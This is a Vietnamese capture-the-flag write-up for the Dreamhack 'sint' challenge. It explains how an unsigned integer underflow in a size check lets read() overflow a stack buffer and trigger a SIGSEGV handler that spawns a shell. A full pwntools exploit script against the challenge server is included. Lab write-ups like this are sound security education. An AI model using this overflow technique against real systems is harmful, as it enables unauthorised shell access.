# Challenge: SINT

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/sint_chall/sint)
- Chương trình thực thi như sau:
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [esp+0h] [ebp-104h] BYREF
  char buf[256]; // [esp+4h] [ebp-100h] BYREF

  initialize();
  signal(11, (__sighandler_t)get_shell);
  printf("Size: ");
  __isoc99_scanf("%d", &v4);
  if ( v4 >= 257 )
  {
    puts("Buffer Overflow!");
    exit(0);
  }
  printf("Data: ");
  read(0, buf, v4 - 1);
  return 0;
}
```
- Checksec:
```
+ Arch:       i386-32-little
+ RELRO:      Partial RELRO
+ Stack:      No canary found
+ NX:         NX enabled
+ PIE:        No PIE (0x8048000)
+ Stripped:   No
```

## Giải pháp
- Do v4 yêu cầu dữ liệu vào > -1 và < 257, và ở hàm read lại đọc dữ liệu v4 - 1. Tức là luôn nhập đc giá trị v4 nhỏ hơn 1.
- Nếu nhập v4 = 0 thì read sẽ có buf là v4 - 1 nhưng v4 là kiểu dữ liệu unsigned int tức là nếu dữ liệu âm thì nó sẽ được đẩy về là MAX INT.
> Kỹ thuật được gọi là **Integer Underflow**, khi khai thác unsigned int về âm thì input sẽ được nhập vô hạn.
- Sau khi khai thác kỹ thuật Integer Underflow, ta thấy rằng trong main có hàm _signal(11, get_shell)_.
- Thì tham số 1 ('11') ở đây tức là **SIGSEGV** và hàm signal có tác dụng là khi chương trình báo lỗi như tham số 1, chương trình sẽ không mặc định ngắt chương trình mà nó sẽ thực thi hàm ở tham số 2 ('get_shell').
> Khiến cho chương trình báo lỗi SIGSEGV để lấy shell.

## Quá trình
- Ta set v4 = 0, thì offset data của read = -1 do read = v4 - 1.
- Như kỹ thuật nói trên, ta sẽ tận dụng nó để có thể viết payload vô hạn.
- Việc ta cần giải quyết đó là làm cho chương trình báo lỗi SIGSEGV bằng cách overwrite return address bằng bất kì bytes rác nào.
> Chương trình báo lỗi SIGSEGV và chương trình sẽ thực thi hàm get_shell.

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('sint', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+68
        c
        b*main+137
        
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 22295)
else:
    p = process([exe.path])
GDB()

slna(b'Size: ', 0)
payload = flat(
    b'A'*256,
    b'A'*8,
    )
sla(b'Data: ', payload)

p.interactive()
```
